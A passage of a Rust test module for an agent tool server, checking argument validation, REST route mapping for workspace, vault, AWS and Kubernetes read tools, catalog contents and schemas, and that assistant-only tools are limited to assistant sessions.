        ctx.source = Some("vault-docs-review".into());
        let response = handle(
            &ctx,
            json!({"jsonrpc":"2.0","id":31,"method":"tools/call","params":{
                "name":"otto_vault_write","arguments":{"vault_id":1,"path":"x.md","content":"x"}
            }}),
        )
        .await
        .unwrap();
        assert_eq!(response["result"]["isError"], json!(true));
        assert!(response["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("disabled for documentation review"));
    }

    #[tokio::test]
    async fn vault_write_file_requires_string_content_but_allows_explicit_empty() {
        let ctx = test_ctx();
        for arguments in [
            json!({ "vault_id": 1, "path": "api.json" }),
            json!({ "vault_id": 1, "path": "api.json", "content": 7 }),
        ] {
            let resp = handle(
                &ctx,
                json!({ "jsonrpc": "2.0", "id": 21, "method": "tools/call",
                        "params": { "name": "otto_vault_write_file", "arguments": arguments } }),
            )
            .await
            .unwrap();
            assert_eq!(resp["result"]["isError"], json!(true));
            let text = resp["result"]["content"][0]["text"].as_str().unwrap();
            assert!(text.contains("content"), "got: {text}");
        }

        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 22, "method": "tools/call",
                    "params": { "name": "otto_vault_write_file", "arguments": {
                        "vault_id": 1, "path": "api.json", "content": "{}", "if_hash": 7
                    } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("if_hash"), "got: {text}");

        let err = run_tool(
            &ctx,
            "otto_vault_write_file",
            &json!({ "vault_id": 1, "path": "api.json", "content": "" }),
        )
        .await
        .unwrap_err();
        assert!(
            !err.contains("content"),
            "explicit empty content must pass argument validation: {err}"
        );
    }

    #[tokio::test]
    async fn canvas_create_scene_errors_without_title() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 11, "method": "tools/call",
                    "params": { "name": "canvas_create_scene", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("title"), "got: {text}");
    }

    #[tokio::test]
    async fn canvas_create_scene_errors_on_bad_format() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 12, "method": "tools/call",
                    "params": { "name": "canvas_create_scene",
                                 "arguments": { "title": "T", "format": "svg" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("format"), "got: {text}");
    }

    #[tokio::test]
    async fn canvas_create_scene_errors_without_workspace() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 13, "method": "tools/call",
                    "params": { "name": "canvas_create_scene", "arguments": { "title": "T" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[tokio::test]
    async fn canvas_update_scene_errors_without_source() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 14, "method": "tools/call",
                    "params": { "name": "canvas_update_scene", "arguments": { "scene_id": "s1" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("source"), "got: {text}");
    }

    #[test]
    fn read_route_maps_workspace_and_arg_tools() {
        let ws = Some("ws1");
        assert_eq!(
            read_route("otto_list_sessions", &json!({}), ws).unwrap(),
            ReadCall {
                post: false,
                path: "/workspaces/ws1/sessions".into(),
                body: None
            }
        );
        assert_eq!(
            read_route("otto_list_workflow_runs", &json!({"workflow_id":"w1"}), ws)
                .unwrap()
                .path,
            "/workflows/w1/runs?summary=true"
        );
        assert_eq!(
            read_route(
                "otto_list_issue_transitions",
                &json!({"account_id":"a","key":"K-1"}),
                ws
            )
            .unwrap()
            .path,
            "/issue/a/K-1/transitions"
        );
        assert_eq!(
            read_route(
                "otto_list_prs",
                &json!({"repo_id":"r","state":"all","page":2}),
                ws
            )
            .unwrap()
            .path,
            "/repos/r/prs?state=all&page=2"
        );
        assert_eq!(
            read_route(
                "otto_list_improvement_edits",
                &json!({"status":"applied"}),
                ws
            )
            .unwrap()
            .path,
            "/workspaces/ws1/improvement/edits?status=applied"
        );
        assert_eq!(
            read_route("k8s_health", &json!({"cluster_id":"c","window":"6h"}), ws)
                .unwrap()
                .path,
            "/k8s/clusters/c/monitor/health?window=6h"
        );
        assert_eq!(
            read_route(
                "k8s_describe",
                &json!({"cluster_id":"c","kind":"nodes","name":"n1"}),
                ws
            )
            .unwrap()
            .path,
            "/k8s/clusters/c/resource?kind=nodes&name=n1"
        );
        assert_eq!(
            read_route("otto_get_workflow_run", &json!({"run_id":"r1"}), ws)
                .unwrap()
                .path,
            "/workflow-runs/r1"
        );
        assert_eq!(
            read_route("otto_list_broker_topics", &json!({"cluster_id":"c1"}), ws)
                .unwrap()
                .path,
            "/brokers/clusters/c1/topics"
        );
        assert_eq!(
            read_route("otto_list_findings", &json!({"review_id":"rv1"}), ws)
                .unwrap()
                .path,
            "/reviews/rv1/findings"
        );
        let c = read_route("otto_search_memory", &json!({"query":"db","k":3}), ws).unwrap();
        assert!(c.post);
        assert_eq!(c.path, "/workspaces/ws1/memory/search");
        assert_eq!(c.body.unwrap(), json!({"text":"db","k":3}));
        assert_eq!(
            read_route("otto_usage_summary", &json!({"days":7}), ws)
                .unwrap()
                .path,
            "/usage/summary?days=7"
        );
        let c = read_route(
            "otto_search_issues",
            &json!({"account_id":"a1","query":"a = b"}),
            ws,
        )
        .unwrap();
        assert!(c.path.starts_with("/issue/search?account_id=a1"));
        assert!(c.path.contains("&q=a%20%3D%20b"), "got {}", c.path);
        assert_eq!(
            read_route("otto_list_improvement_edits", &json!({}), ws)
                .unwrap()
                .path,
            "/workspaces/ws1/improvement/edits"
        );
        assert_eq!(
            read_route("otto_vault_list", &json!({}), ws).unwrap().path,
            "/workspaces/ws1/vault/vaults"
        );
        assert_eq!(
            read_route(
                "otto_vault_read",
                &json!({"vault_id":3,"path":"services/auth api.md"}),
                ws
            )
            .unwrap()
            .path,
            "/workspaces/ws1/vault/vaults/3/note?path=services%2Fauth%20api.md"
        );
        let c = read_route(
            "otto_vault_search",
            &json!({"vault_id":3,"query":"jwt"}),
            ws,
        )
        .unwrap();
        assert!(c.post);
        assert_eq!(c.path, "/workspaces/ws1/vault/vaults/3/search");
        assert_eq!(c.body.unwrap()["limit"], json!(20));
        // Graph defaults: local when a focus path is given, full otherwise.
        assert!(
            read_route("otto_vault_graph", &json!({"vault_id":3,"path":"a.md"}), ws)
                .unwrap()
                .path
                .contains("mode=local")
        );
        assert!(read_route("otto_vault_graph", &json!({"vault_id":3}), ws)
            .unwrap()
            .path
            .contains("mode=full"));
        let c = read_route("otto_vault_okf_validate", &json!({"vault_id":3}), ws).unwrap();
        assert!(c.post);
        // Swarm board reads: explicit-id tools, no workspace needed.
        assert_eq!(
            read_route("swarm_list_projects", &json!({"swarm_id":"s1"}), ws)
                .unwrap()
                .path,
            "/swarm/swarms/s1/projects"
        );
        assert_eq!(
            read_route("swarm_list_tasks", &json!({"project_id":"p1"}), ws)
                .unwrap()
                .path,
            "/swarm/projects/p1/tasks"
        );
        assert_eq!(
            read_route("swarm_utilization", &json!({"swarm_id":"s1"}), ws)
                .unwrap()
                .path,
            "/swarm/swarms/s1/utilization"
        );
        // Delegation reads: explicit session id, no workspace needed.
        assert_eq!(
            read_route("otto_get_session", &json!({"session_id":"s9"}), ws)
                .unwrap()
                .path,
            "/sessions/s9"
        );
        assert_eq!(
            read_route(
                "otto_wait_session",
                &json!({"session_id":"s9","status":"idle","timeout_secs":10}),
                ws
            )
            .unwrap()
            .path,
            "/sessions/s9/wait?status=idle&timeout_secs=10"
        );
        assert_eq!(
            read_route("otto_wait_session", &json!({"session_id":"s9"}), ws)
                .unwrap()
                .path,
            "/sessions/s9/wait?"
        );
    }

    #[test]
    fn catalog_lists_the_delegation_tools() {
        let tools = tool_catalog();
        let names: Vec<&str> = tools["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in [
            "otto_get_session",
            "otto_wait_session",
            "otto_open_session",
            "otto_send_message",
        ] {
            assert!(names.contains(&t), "catalog missing delegation tool {t}");
        }
    }

    #[test]
    fn catalog_lists_the_swarm_board_tools() {
        let tools = tool_catalog();
        let names: Vec<&str> = tools["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in [
            "swarm_create_task",
            "swarm_update_task",
            "swarm_run_task",
            "swarm_stop_run",
        ] {
            assert!(names.contains(&t), "catalog missing swarm write tool {t}");
        }
    }

    #[test]
    fn catalog_lists_the_aws_tools() {
        let cat = tool_catalog();
        let tools = cat["tools"].as_array().unwrap();
        for t in [
            "aws_list_accounts",
            "aws_s3_list_buckets",
            "aws_s3_list_objects",
            "aws_s3_preview",
            "aws_sqs_list_queues",
            "aws_sqs_peek",
            "aws_sqs_send",
            "aws_ec2_list_instances",
            "aws_athena_list_tables",
            "aws_athena_query",
            "aws_athena_get_query",
            "aws_eks_list_clusters",
        ] {
            let tool = tools
                .iter()
                .find(|x| x["name"] == t)
                .unwrap_or_else(|| panic!("catalog missing aws tool {t}"));
            assert_eq!(
                tool["inputSchema"]["type"],
                json!("object"),
                "{t} schema not an object"
            );
            // Every required key is declared in properties.
            for r in tool["inputSchema"]["required"]
                .as_array()
                .into_iter()
                .flatten()
            {
                assert!(
                    tool["inputSchema"]["properties"]
                        .get(r.as_str().unwrap())
                        .is_some(),
                    "{t}: required {r} missing from properties"
                );
            }
        }
        // The writers advertise themselves as mutating so an agent reads it
        // before calling.
        for w in ["aws_athena_query", "aws_sqs_send"] {
            let d = tools.iter().find(|x| x["name"] == w).unwrap()["description"]
                .as_str()
                .unwrap();
            assert!(
                d.starts_with("MUTATING"),
                "{w} description must flag MUTATING"
            );
        }
    }

    #[test]
    fn catalog_lists_the_k8s_tools() {
        let cat = tool_catalog();
        let tools = cat["tools"].as_array().unwrap();
        for t in [
            "k8s_list_clusters",
            "k8s_get_resources",
            "k8s_describe",
            "k8s_logs",
            "k8s_top",
            "k8s_action",
        ] {
            let tool = tools
                .iter()
                .find(|x| x["name"] == t)
                .unwrap_or_else(|| panic!("catalog missing k8s tool {t}"));
            assert_eq!(
                tool["inputSchema"]["type"],
                json!("object"),
                "{t} schema not an object"
            );
            for r in tool["inputSchema"]["required"]
                .as_array()
                .into_iter()
                .flatten()
            {
                assert!(
                    tool["inputSchema"]["properties"]
                        .get(r.as_str().unwrap())
                        .is_some(),
                    "{t}: required {r} missing from properties"
                );
            }
        }
        let action = tools.iter().find(|x| x["name"] == "k8s_action").unwrap();
        assert_eq!(
            action["inputSchema"]["required"],
            json!(["cluster_id", "action", "kind", "namespace", "name"])
        );
        assert!(action["description"]
            .as_str()
            .unwrap()
            .starts_with("MUTATING"));
    }

    #[test]
    fn read_route_maps_aws_and_k8s_reads() {
        assert_eq!(
            read_route("aws_list_accounts", &json!({}), None)
                .unwrap()
                .path,
            "/aws/accounts"
        );
        assert_eq!(
            read_route("aws_s3_list_buckets", &json!({"account_id":"a1"}), None)
                .unwrap()
                .path,
            "/aws/accounts/a1/s3/buckets?"
        );
        assert_eq!(
            read_route(
                "aws_s3_list_objects",
                &json!({"account_id":"a1","bucket":"b","prefix":"logs/2026/","max":50}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/s3/buckets/b/objects?prefix=logs%2F2026%2F&max=50"
        );
        assert_eq!(
            read_route(
                "aws_s3_preview",
                &json!({"account_id":"a1","bucket":"b","key":"a b.json","max_bytes":1024}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/s3/buckets/b/preview?key=a%20b.json&max_bytes=1024"
        );
        assert_eq!(
            read_route(
                "aws_sqs_list_queues",
                &json!({"account_id":"a1","prefix":"orders"}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/sqs/queues?prefix=orders"
        );
        // Peek is the one read-only POST: visibility_timeout is pinned to 0 and
        // `max` clamped into SQS's 1..10 window.
        let peek = read_route(
            "aws_sqs_peek",
            &json!({"account_id":"a1","url":"https://sqs.eu-west-1.amazonaws.com/1/q","max":50}),
            None,
        )
        .unwrap();
        assert!(peek.post);
        assert_eq!(peek.path, "/aws/accounts/a1/sqs/queues/peek?");
        assert_eq!(
            peek.body.unwrap(),
            json!({"url":"https://sqs.eu-west-1.amazonaws.com/1/q","visibility_timeout":0,"max":10})
        );
        assert_eq!(
            read_route(
                "aws_ec2_list_instances",
                &json!({"account_id":"a1","region":"us-east-1","state":"running"}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/ec2/instances?region=us-east-1&state=running"
        );
        assert_eq!(
            read_route(
                "aws_athena_list_tables",
                &json!({"account_id":"a1","database":"db"}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/athena/tables?database=db"
        );
        assert_eq!(
            read_route(
                "aws_athena_get_query",
                &json!({"account_id":"a1","query_execution_id":"q-1","token":"t2"}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/athena/query/q-1?token=t2"
        );
        assert_eq!(
            read_route(
                "aws_eks_list_clusters",
                &json!({"account_id":"a1","region":"eu-west-1"}),
                None
            )
            .unwrap()
            .path,
            "/aws/accounts/a1/eks/clusters?region=eu-west-1"
        );
        assert_eq!(
            read_route("k8s_list_clusters", &json!({}), None)
                .unwrap()
                .path,
            "/k8s/clusters"
        );
        assert_eq!(
            read_route(
                "k8s_get_resources",
                &json!({"cluster_id":"c1","kind":"pods","namespace":"prod","label":"app=web"}),
                None
            )
            .unwrap()
            .path,
            "/k8s/clusters/c1/resources?kind=pods&ns=prod&label=app%3Dweb"
        );
        // No namespace ⇒ no `ns=` (route default = all namespaces).
        assert_eq!(
            read_route(
                "k8s_get_resources",
                &json!({"cluster_id":"c1","kind":"deployments"}),
                None
            )
            .unwrap()
            .path,
            "/k8s/clusters/c1/resources?kind=deployments"
        );
        assert_eq!(
            read_route(
                "k8s_describe",
                &json!({"cluster_id":"c1","kind":"deployments","namespace":"prod","name":"web"}),
                None
            )
            .unwrap()
            .path,
            "/k8s/clusters/c1/resource?kind=deployments&name=web&ns=prod"
        );
        assert_eq!(
            read_route(
                "k8s_top",
                &json!({"cluster_id":"c1","namespace":"prod"}),
                None
            )
            .unwrap()
            .path,
            "/k8s/clusters/c1/metrics?ns=prod"
        );
        // None of the console reads need a workspace; missing ids are errors.
        assert!(read_route("aws_s3_list_buckets", &json!({}), None).is_err());
        assert!(read_route(
            "k8s_describe",
            &json!({"cluster_id":"c1","kind":"pods"}),
            None
        )
        .is_err());
    }

    #[test]
    fn k8s_logs_path_forwards_filters_but_never_follow() {
        let p = k8s_logs_path(&json!({
            "cluster_id":"c1","namespace":"prod","pod":"web-1","container":"app",
            "tail":200,"since":"10m","previous":true,"follow":true
        }))
        .unwrap();
        assert_eq!(
            p,
            "/k8s/clusters/c1/pods/prod/web-1/logs?container=app&tail=200&since=10m&previous=true"
        );
        assert!(!p.contains("follow"));
        assert!(k8s_logs_path(&json!({"cluster_id":"c1","namespace":"prod"})).is_err());
    }

    #[test]
    fn tail_text_keeps_the_newest_lines() {
        let (t, cut) = tail_text("a\nb\nc", 100);
        assert_eq!(t, "a\nb\nc");
        assert!(!cut);
        let long: String = (0..1000).map(|i| format!("line {i}\n")).collect();
        let (t, cut) = tail_text(&long, 100);
        assert!(cut);
        assert!(t.chars().count() <= 100);
        assert!(
            t.starts_with("line "),
            "cut should land on a line start: {t:?}"
        );
        assert!(t.ends_with("line 999\n"));
        // Multi-byte input never panics on a char boundary.
        let (_, cut) = tail_text(&"é".repeat(300), 100);
        assert!(cut);
    }

    #[tokio::test]
    async fn k8s_action_errors_without_required_ids() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 9, "method": "tools/call",
                    "params": { "name": "k8s_action", "arguments": { "cluster_id": "c1", "action": "restart" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("kind"));
    }

    #[tokio::test]
    async fn aws_athena_query_errors_without_sql() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 9, "method": "tools/call",
                    "params": { "name": "aws_athena_query", "arguments": { "account_id": "a1" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("sql"));
    }

    #[test]
    fn read_route_errors_without_workspace_or_required_arg() {
        assert!(read_route("otto_list_sessions", &json!({}), None).is_err());
        assert!(read_route("otto_get_workflow_run", &json!({}), Some("ws1")).is_err());
        assert!(read_route("otto_search_issues", &json!({}), Some("ws1")).is_err());
        assert!(read_route("nope", &json!({}), Some("ws1")).is_err());
    }

    #[tokio::test]
    async fn feature_read_errors_without_workspace_context() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 7, "method": "tools/call",
                    "params": { "name": "otto_list_sessions", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[test]
    fn assistant_tools_are_shown_only_to_assistant_sessions() {
        let names = |source: Option<&str>| -> Vec<String> {
            tool_catalog_for_source(source)["tools"]
                .as_array()
                .unwrap()
                .iter()
                .map(|t| t["name"].as_str().unwrap().to_string())
                .collect()
        };
        let assistant = names(Some("assistant"));
        for (tool, _) in ASSISTANT_TOOLS {
            assert!(assistant.contains(&tool.to_string()), "assistant catalog missing {tool}");
        }
        // Everyone else keeps the normal catalog without them.
        for source in [None, Some("personal_agent"), Some("vault-docs")] {
            let other = names(source);
            assert!(other.contains(&"otto_db_schema".to_string()));
            assert!(
                !other.iter().any(|n| n.starts_with("assistant_")),
                "{source:?} leaked assistant tools"
            );
        }
        // Every assistant spec is well formed and maps to one endpoint segment.
        for spec in assistant_tool_specs() {
            let name = spec["name"].as_str().unwrap();
            assert!(assistant_segment(name).is_some(), "{name}");
            assert_eq!(spec["inputSchema"]["type"], json!("object"), "{name}");
            if let Some(req) = spec["inputSchema"]["required"].as_array() {
                for r in req {
                    assert!(spec["inputSchema"]["properties"]
                        .get(r.as_str().unwrap())
                        .is_some());
                }
            }
        }
        assert_eq!(assistant_tool_specs().len(), ASSISTANT_TOOLS.len());
    }

    #[test]
    fn assistant_memory_tools_win_over_their_governed_twins() {
        // The governed otto.assistant_* catalog entries are covered natively,
        // so `otto_assistant_remember` is never advertised twice.
        for n in ["assistant_remember", "assistant_forget", "assistant_recall"] {
            assert!(governed_tool_for_stdio_name(&format!("otto_{n}")).is_none(), "{n}");
        }
        let enabled = vec!["otto.assistant_recall".to_string()];
        assert!(governed_tools_for(&enabled).is_empty());
    }

    #[tokio::test]
    async fn assistant_tool_call_surfaces_a_daemon_error() {
        let mut ctx = test_ctx();
        ctx.source = Some("assistant".into());
        let resp = handle(
            &ctx,
            json!({"jsonrpc":"2.0","id":41,"method":"tools/call","params":{
                "name":"assistant_remember","arguments":{"text":"likes tea"}
            }}),
        )
        .await
        .unwrap();
        // The daemon is unreachable in tests: a tool error, never "unknown tool".
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(!text.contains("unknown tool"), "{text}");
    }

    /// A Ctx pointing at an unreachable base; used by the no-upstream tests above
    /// (which never actually call out). Audit disabled.
    fn test_ctx() -> Ctx {
        Ctx {
            http: reqwest::Client::new(),
            base: "http://127.0.0.1:9".to_string(),
            token: "test-token".to_string(),
            session_id: Some("sess-test".into()),
            workspace_id: Some("ws-test".into()),
            source: None,
            audit: None,
        }
    }
}
